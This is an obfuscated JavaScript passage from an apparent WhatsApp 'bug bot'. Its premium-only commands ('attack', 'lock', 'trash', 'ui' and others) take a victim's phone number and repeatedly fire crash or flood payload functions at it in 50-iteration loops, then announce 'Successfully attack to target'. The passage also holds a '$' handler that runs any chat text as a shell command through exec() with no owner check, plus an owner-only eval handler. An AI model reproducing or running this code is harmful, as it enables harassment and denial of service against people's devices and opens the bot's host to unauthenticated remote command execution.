          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      case "max":
      case "hero":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      case "ulti":
      case "trash":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      case "attack":
      case "lock":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      case "delta":
      case "ui":
        if (!_0x1a75ef) {
          return _0x2bc992(mess.only.premium);
        }
        if (!q) {
          return _0x2bc992("Example: " + (_0x2064f9 + _0xf77d4c) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x2bc992(_0x151e71);
        for (let _0x8ed1eb = 0; _0x8ed1eb < 50; _0x8ed1eb++) {
          await _0x5668b8(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x46a00d(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
          await _0x29b9b2(target, _0x32d439);
          await _0x26308e(target, _0x32d439);
        }
        _0x2bc992("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 " + target + " 🇮🇩  \n 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : " + _0xf77d4c + " 🇮🇩\n 𝗗𝗼𝗻𝗲 𝗯𝘂𝗴");
        break;
      default:
    }
    if (_0x53d892.startsWith("$")) {
      exec(_0x53d892.slice(2), (_0x3aeefb, _0x3e1d69) => {
        if (_0x3aeefb) {
          return _0x2bc992(_0x3aeefb);
        }
        if (_0x3e1d69) {
          return _0x2bc992(_0x3e1d69);
        }
      });
    }
    if (_0x53d892.startsWith(">")) {
      if (!_0x339e8f) {
        return _0x2bc992(mess.only.owner);
      }
      try {
        let _0x4dcac6 = await eval(_0x53d892.slice(2));
        if (typeof _0x4dcac6 !== "string") {
          _0x4dcac6 = require("util").inspect(_0x4dcac6);
        }
        await _0x2bc992(_0x4dcac6);
      } catch (_0x54fdf5) {
        _0x2bc992(String(_0x54fdf5));
      }
    }
  } catch (_0xd24bb7) {
    console.log(_0xd24bb7);
    _0x463682.sendMessage(owner + "@s.whatsapp.net", {
      text: "" + util.format(_0xd24bb7)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});